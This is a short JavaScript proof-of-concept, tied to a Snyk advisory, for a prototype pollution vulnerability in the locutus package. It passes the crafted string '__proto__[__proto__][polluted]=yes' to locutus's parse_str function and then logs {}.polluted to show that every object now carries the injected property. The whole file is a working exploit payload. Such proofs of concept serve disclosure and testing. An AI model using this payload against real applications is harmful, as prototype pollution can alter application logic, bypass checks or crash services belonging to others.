//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
const locutus = require("locutus");

locutus.php.strings.parse_str("__proto__[__proto__][polluted]=yes");

console.log({}.polluted);
// console.log(polluted);
